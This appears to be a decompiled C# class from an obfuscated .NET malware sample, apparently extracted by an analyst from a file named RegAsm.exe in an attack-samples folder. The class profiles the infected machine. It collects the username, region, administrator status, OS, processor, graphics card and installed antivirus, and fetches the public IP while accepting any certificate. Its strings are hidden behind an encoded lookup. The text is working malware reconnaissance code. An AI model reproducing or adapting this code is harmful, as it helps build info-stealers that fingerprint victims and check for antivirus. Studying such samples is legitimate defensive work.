// Decompiled with JetBrains decompiler
// Type: xWf.WWM
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;

namespace xWf
{
  internal static class WWM
  {
    private static string Username;
    private static string Location;
    private static string ResultPrivilege;
    private static string OperativeSystem;
    private static string ProcessorName;
    private static string GraphicCard;
    private static string IP;
    private static string AV;
    internal static WWM XlM;

    public static string YCF()
    {
      if (!string.IsNullOrWhiteSpace(WWM.Username))
        return WWM.Username;
      WWM.Username = Environment.UserName;
      return WWM.Username;
    }

    public static string qCJ()
    {
      try
      {
        if (!string.IsNullOrWhiteSpace(WWM.Location))
          return WWM.Location;
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        WWM.fW5 fW5 = new WWM.fW5();
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(w4.bx(12198, w4.vY));
        // ISSUE: reference to a compiler-generated field
        fW5.geoID = (string) registryKey.GetValue(w4.bx(12264, w4.vY));
        // ISSUE: reference to a compiler-generated method
        WWM.Location = ((IEnumerable<CultureInfo>) CultureInfo.GetCultures(CultureTypes.SpecificCultures)).Select<CultureInfo, RegionInfo>((Func<CultureInfo, RegionInfo>) (x => new RegionInfo(x.ToString()))).FirstOrDefault<RegionInfo>(new Func<RegionInfo, bool>(fW5.RCG)).TwoLetterISORegionName;
        return WWM.Location;
      }
      catch
      {
      }
      return w4.bx(9610, w4.vY);
    }

    public static bool cCk()
    {
      try
      {
        if (!string.IsNullOrWhiteSpace(WWM.ResultPrivilege))
          return Convert.ToBoolean(WWM.ResultPrivilege);
        WWM.ResultPrivilege = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
        return Convert.ToBoolean(WWM.ResultPrivilege);
      }
      catch
      {
      }
      return false;
    }

    public static string BC9()
    {
      if (!string.IsNullOrWhiteSpace(WWM.OperativeSystem))
        return WWM.OperativeSystem;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(w4.bx(12280, w4.vY)))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
            {
              string str1 = enumerator.Current[w4.bx(12354, w4.vY)].ToString();
              string str2 = ((string) WWM.Jl5((object) Environment.Is64BitOperatingSystem.ToString(), (object) w4.bx(12372, w4.vY), (object) w4.bx(12384, w4.vY))).Replace(w4.bx(12400, w4.vY), w4.bx(12414, w4.vY));
              return WWM.OperativeSystem = str1 + str2;
            }
          }
        }
      }
      catch
      {
      }
      return w4.bx(9610, w4.vY);
    }

    public static string BC2()
    {
      if (!string.IsNullOrWhiteSpace(WWM.ProcessorName))
        return WWM.ProcessorName;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(w4.bx(12430, w4.vY)))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              return WWM.ProcessorName = enumerator.Current[w4.bx(12492, w4.vY)].ToString();
          }
        }
      }
      catch
      {
      }
      return w4.bx(9610, w4.vY);
    }

    public static string iCU()
    {
      if (!string.IsNullOrWhiteSpace(WWM.GraphicCard))
        return WWM.GraphicCard;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(w4.bx(12504, w4.vY)))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              return WWM.GraphicCard = ((ManagementBaseObject) WWM.jlw((object) enumerator))[w4.bx(12492, w4.vY)].ToString();
          }
        }
      }
      catch
      {
      }
      return w4.bx(9610, w4.vY);
    }

    public static string NCD()
    {
      string str1;
      try
      {
        if (string.IsNullOrWhiteSpace(WWM.IP))
        {
          ServicePointManager.Expect100Continue = true;
          ServicePointManager.SecurityProtocol = (SecurityProtocolType) 3312;
          ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback) ((_param1, _param2, _param3, _param4) => true);
          HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(w4.bx(12578, w4.vY));
          httpWebRequest.UseDefaultCredentials = true;
          httpWebRequest.Timeout = 10000;
          using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
          {
            string str2 = new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
            if (((Group) WWM.Wlq((object) str2, (object) w4.bx(12622, w4.vY))).Success)
            {
              str1 = str2;
              goto label_13;
            }
          }
        }
        else
        {
          str1 = WWM.IP;
          int num = 0;
          if (WWM.Ulk() == null)
            goto label_5;
label_2:
          switch (num)
          {
            default:
              goto label_13;
          }
label_5:
          num = 0;
          goto label_2;
        }
      }
      catch
      {
      }
      return w4.bx(12694, w4.vY);
label_13:
      return str1;
    }

    public static string MC8()
    {
      if (!string.IsNullOrWhiteSpace(WWM.AV))
        return WWM.AV;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Environment.OSVersion.Version.Major >= 6 ? w4.bx(12758, w4.vY) : w4.bx(12716, w4.vY), w4.bx(12802, w4.vY)))
        {
          string str = string.Empty;
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            str = str + managementObject[w4.bx(12866, w4.vY)].ToString() + w4.bx(644, w4.vY);
          WWM.AV = str.Length <= 0 ? w4.bx(9610, w4.vY) : str;
          return WWM.AV;
        }
      }
      catch
      {
      }
      return w4.bx(9610, w4.vY);
    }

    static WWM()
    {
      yd.bx(yd.EI);
      WWM.Username = string.Empty;
      WWM.Location = string.Empty;
      WWM.ResultPrivilege = string.Empty;
      WWM.OperativeSystem = string.Empty;
      WWM.ProcessorName = string.Empty;
      WWM.GraphicCard = string.Empty;
    }

    internal static bool blI() => WWM.XlM == null;

    internal static WWM Ulk() => WWM.XlM;

    internal static object Jl5([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0).Replace((string) obj1, (string) obj2);

    internal static object jlw([In] object obj0) => (object) ((ManagementObjectCollection.ManagementObjectEnumerator) obj0).Current;

    internal static object Wlq([In] object obj0, [In] object obj1) => (object) Regex.Match((string) obj0, (string) obj1);
  }
}
